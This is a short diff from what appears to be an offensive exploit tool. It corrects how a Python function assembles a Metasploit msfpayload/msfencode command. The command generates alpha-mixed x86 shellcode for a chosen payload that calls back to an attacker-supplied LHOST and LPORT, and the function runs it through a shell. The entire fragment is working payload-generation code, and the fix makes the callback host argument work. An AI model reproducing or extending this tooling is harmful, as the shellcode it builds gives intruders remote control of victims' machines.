@@ -35,7 +35,7 @@ def create_shellcode(args):
     msfpayload = args.msfroot + "msfpayload"
     msfencode = args.msfroot + "msfencode"
     msfgen = "{0} {1} EXITFUNC=thread LPORT={2}".format(msfpayload, args.payload, args.lport)
-    msfgen += " LHOST={0} R | {1} -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX".format(msfencode, args.lhost)
+    msfgen += " LHOST={0} R | {1} -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX".format(args.lhost, msfencode)
     shellcode = Popen(msfgen, stdout=PIPE, shell=True).stdout.read()
 
 
